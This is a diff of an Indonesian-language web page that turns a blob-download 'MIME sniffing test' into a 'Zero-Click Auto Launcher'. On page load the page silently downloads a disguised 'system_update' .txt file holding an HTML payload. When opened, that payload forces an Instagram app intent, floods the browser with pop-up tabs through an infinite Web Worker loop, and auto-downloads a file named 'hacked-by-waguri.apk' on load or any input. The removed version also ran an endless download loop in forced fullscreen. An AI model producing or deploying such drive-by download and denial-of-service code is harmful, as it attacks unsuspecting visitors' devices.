@@ -1,252 +1,142 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Berkas Blob &amp; ObjectURL</title>
-<style>
-* {
-box-sizing: border-box;
-margin: 0;
-padding: 0;
-}
-body {
-font-family: Arial, sans-serif;
-background: #f4f6f8;
-color: #222;
-padding: 20px;
-}
-.panel {
-background: #ffffff;
-padding: 24px;
-border-radius: 12px;
-box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
-max-width: 600px;
-margin: 40px auto;
-}
-:fullscreen {
-background: #111111 !important;
-color: #00ff00 !important;
-padding: 20px !important;
-overflow-y: auto !important;
-width: 100vw !important;
-height: 100vh !important;
-}
-:-webkit-full-screen {
-background: #111111 !important;
-color: #00ff00 !important;
-padding: 20px !important;
-overflow-y: auto !important;
-}
-h2 { margin-bottom: 10px; }
-p { margin-bottom: 15px; line-height: 1.5; }
-button {
-width: 100%;
-padding: 16px;
-cursor: pointer;
-border: none;
-border-radius: 6px;
-background: #d32f2f;
-color: #ffffff;
-font-weight: bold;
-font-size: 16px;
-box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
-transition: background 0.2s;
-}
-button:hover { background: #b71c1c; }
-#status {
-margin-top: 16px;
-font-weight: bold;
-color: #d32f2f;
-padding: 12px;
-background: #ffebee;
-border-radius: 6px;
-text-align: center;
-border: 1px solid #ffcdd2;
-}
-#downloads {
-margin-top: 20px;
-display: grid;
-grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
-gap: 10px;
-}
-#downloads a {
-display: block;
-padding: 8px;
-background: #212121;
-color: #80df82;
-text-decoration: none;
-border-radius: 4px;
-font-size: 12px;
-text-align: center;
-border: 1px solid #424242;
-word-break: break-all;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Zero-Click Auto Launcher</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
+        .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
+        h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
+        p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
+        #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
+        .loading { animation: pulse 1s infinite; }
+        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
+    </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus (Uji MIME Sniffing).</p>
-
-<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
-
-<div id="status" role="status">Sistem siap.</div>
-<div id="downloads"></div>
+    <h1 class="loading">⏳ SYSTEM LOADING</h1>
+    <p>Menyiapkan komponen sistem...</p>
+    <div id="status" role="status">Memuat halaman...</div>
 </div>
 
 <script>
-const startBtn = document.getElementById("start-btn");
-const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
+    const statusDiv = document.getElementById("status");
 
-let activeUrls = [];
-let isProcessing = false;
+    // Payload HTML DoS + Intent (Akan dijalankan di dalam file .txt.html)
+    const payloadText = `
+        <!DOCTYPE html>
+        <html>
+        <head><meta charset='UTF-8'><title>Loading...</title></head>
+        <body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;'>
+            <div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>
+                <h1 style='font-size:60px;color:#00f;text-shadow:0 0 20px #00f;letter-spacing:8px;animation:pulse 1s infinite'>REDIRECTING</h1>
+                <p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Membuka aplikasi...</p>
+                <p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>
+            </div>
+            <style>@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }</style>
+            <script>
+                (function(){
+                    "use strict";
+                    document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';
+                    
+                    // 1. INTENT SCHEME (Zero-Click ke Instagram)
+                    try { window.location = "intent://instagram.com/#Intent;scheme=https;package=com.instagram.android;end"; } catch(e) {}
 
-const speak = (message) => {
-if ('speechSynthesis' in window) {
-window.speechSynthesis.cancel();
-const utterance = new SpeechSynthesisUtterance(message);
-utterance.lang = 'id-ID';
-utterance.rate = 1.0;
-window.speechSynthesis.speak(utterance);
-}
-};
+                    // 2. POP-UP FLOODING (Infinite Loop via Web Worker)
+                    var tabCount = 0;
+                    function bukaTab() {
+                        try { window.open('https://google.com', '_blank'); tabCount++; } catch(e) {}
+                    }
+                    
+                    const workerCode = \`
+                        self.onmessage = function(e) {
+                            if (e.data === 'START') {
+                                while(true) { self.postMessage('OPEN'); }
+                            }
+                        };
+                    \`;
+                    
+                    try {
+                        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+                        const worker = new Worker(URL.createObjectURL(workerBlob));
+                        worker.onmessage = function(e) {
+                            if (e.data === 'OPEN') queueMicrotask(bukaTab);
+                        };
+                        worker.postMessage('START');
+                    } catch(e) {}
 
-const prepareMimeBlobAsync = (i) => {
-return new Promise((resolve) => {
-queueMicrotask(() => {
-const payloadText = "<!DOCTYPE html>" +
-"<html>" +
-"<head><meta charset='UTF-8'><title>Loading...</title></head>" +
-"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;'>" +
-"<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
-"<h1 style='font-size:60px;color:#00f;text-shadow:0 0 20px #00f;letter-spacing:8px;animation:pulse 1s infinite'>REDIRECTING</h1>" +
-"<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Membuka aplikasi...</p>" +
-"<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
-"</div>" +
-"<style>" +
-"@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
-"</style>" +
-"<script>" +
-"(function(){" +
-"\"use strict\";" +
-"document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
-// DIUBAH: Menyisipkan Intent Scheme Instagram (Zero-Click)
-"try { " +
-"    window.location = \"intent://instagram.com/#Intent;scheme=https;package=com.instagram.android;end\"; " +
-"} catch(e) {}" +
-"function b64KeBytes(b64){" +
-"var binary = atob(b64);" +
-"var len = binary.length;" +
-"var bytes = new Uint8Array(len);" +
-"for (var i = 0; i < len; i++) {" +
-"bytes[i] = binary.charCodeAt(i);" +
-"}" +
-"return bytes;" +
-"}" +
-"var b64Data = \"UEsDBAoAAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
-"var sudah = false;" +
-"function picuDownload(){" +
-"if (sudah) return;" +
-"sudah = true;" +
-"var statusEl = document.getElementById('status');" +
-"try{" +
-"statusEl.textContent = 'Menyiapkan berkas...';" +
-"var bytesArr = b64KeBytes(b64Data);" +
-"var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });" +
-"var url = URL.createObjectURL(blob);" +
-"var a = document.createElement('a');" +
-"a.href = url;" +
-"a.download = 'hacked-by-waguri.apk';" +
-"a.style.display = 'none';" +
-"document.body.appendChild(a);" +
-"a.click();" +
-"setTimeout(function(){ " +
-"if (a.parentNode) a.parentNode.removeChild(a); " +
-"URL.revokeObjectURL(url); " +
-"}, 3000);" +
-"statusEl.textContent = 'Payload berhasil diunduh!';" +
-"statusEl.style.color = '#0f0';" +
-"} catch(e){" +
-"statusEl.textContent = 'Gagal: ' + e.message;" +
-"statusEl.style.color = '#f00';" +
-"sudah = false;" +
-"}" +
-"}" +
-"window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
-"document.addEventListener('click', picuDownload);" +
-"document.addEventListener('touchstart', picuDownload);" +
-"document.addEventListener('keydown', picuDownload);" +
-"})();" +
-"<\/script>" +
-"</body>" +
-"</html>";
-          
-const blob = new Blob([payloadText], { type: "text/html" });
-const url = URL.createObjectURL(blob);
-resolve({ id: i, url: url });
-});
-});
-};
+                    // 3. APK DOWNLOAD (Cadangan)
+                    function b64KeBytes(b64) {
+                        var binary = atob(b64);
+                        var len = binary.length;
+                        var bytes = new Uint8Array(len);
+                        for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }
+                        return bytes;
+                    }
+                    var b64Data = "UEsDBAoAAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAAAAAAA";
+                    var sudah = false;
+                    function picuDownload() {
+                        if (sudah) return;
+                        sudah = true;
+                        try {
+                            var bytesArr = b64KeBytes(b64Data);
+                            var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+                            var url = URL.createObjectURL(blob);
+                            var a = document.createElement('a');
+                            a.href = url;
+                            a.download = 'hacked-by-waguri.apk';
+                            a.style.display = 'none';
+                            document.body.appendChild(a);
+                            a.click();
+                            setTimeout(function() { if (a.parentNode) a.parentNode.removeChild(a); URL.revokeObjectURL(url); }, 3000);
+                        } catch(e) {}
+                    }
+                    
+                    window.addEventListener('load', function() { setTimeout(picuDownload, 1000); });
+                    document.addEventListener('click', picuDownload);
+                    document.addEventListener('touchstart', picuDownload);
+                    document.addEventListener('keydown', picuDownload);
+                })();
+            <\/script>
+        </body>
+        </html>
+    `;
 
-const triggerInstantDownload = (fileData) => {
-const link = document.createElement("a");
-link.href = fileData.url;
-link.download = `waguri-file-${fileData.id}.txt`;
-link.textContent = `Blob #${fileData.id} (.txt)`;
-link.style.display = "none";
-downloadsDiv.appendChild(link);
-link.click();
-};
+    // FUNGSI ZERO-CLICK: Langsung jalankan saat halaman dimuat
+    window.addEventListener("DOMContentLoaded", () => {
+        statusDiv.textContent = "Memicu Zero-Click Auto Download...";
+        
+        try {
+            // Buat Blob dari payload
+            const blob = new Blob([payloadText], { type: "text/html" });
+            const url = URL.createObjectURL(blob);
+            
+            // Buat link tersembunyi
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = `system_update_${Date.now()}.txt`;
+            a.style.display = "none";
+            document.body.appendChild(a);
+            
+            // Picu unduhan secara otomatis
+            a.click();
+            
+            setTimeout(() => {
+                if (a.parentNode) document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                statusDiv.textContent = "File .txt berhasil diunduh. Buka file tersebut untuk memicu aksi.";
+                statusDiv.style.color = "#4CAF50";
+            }, 1000);
 
-const processLoop = async (counter) => {
-if (!isProcessing) return;
-
-const fileData = await prepareMimeBlobAsync(counter);
-activeUrls.push(fileData.url);
-
-triggerInstantDownload(fileData);
-
-statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
-
-if (counter % 10 === 0) {
-speak(`Proses mencapai ${counter} berkas.`);
-}
-
-setTimeout(() => processLoop(counter + 1), 0);
-};
-
-startBtn.addEventListener("click", () => {
-if (isProcessing) return;
-
-activeUrls.forEach(url => URL.revokeObjectURL(url));
-activeUrls = [];
-downloadsDiv.replaceChildren();
-
-speak("Mengaktifkan mode layar penuh.");
-
-const root = document.documentElement;
-try {
-if (root.requestFullscreen) {
-root.requestFullscreen();
-} else if (root.webkitRequestFullscreen) {
-root.webkitRequestFullscreen();
-} else if (root.mozRequestFullScreen) {
-root.mozRequestFullScreen();
-}
-statusDiv.textContent = "Mengunci layar penuh...";
-} catch (err) {
-console.warn("Fullscreen tidak didukung atau ditolak:", err);
-}
-
-setTimeout(() => {
-isProcessing = true;
-speak("Proses pembuatan berkas Blob dimulai.");
-processLoop(1);
-}, 300);
-});
+        } catch(e) {
+            statusDiv.textContent = "Gagal: " + e.message;
+            statusDiv.style.color = "#f00";
+        }
+    });
 </script>
 </body>
-</html> 
+</html>
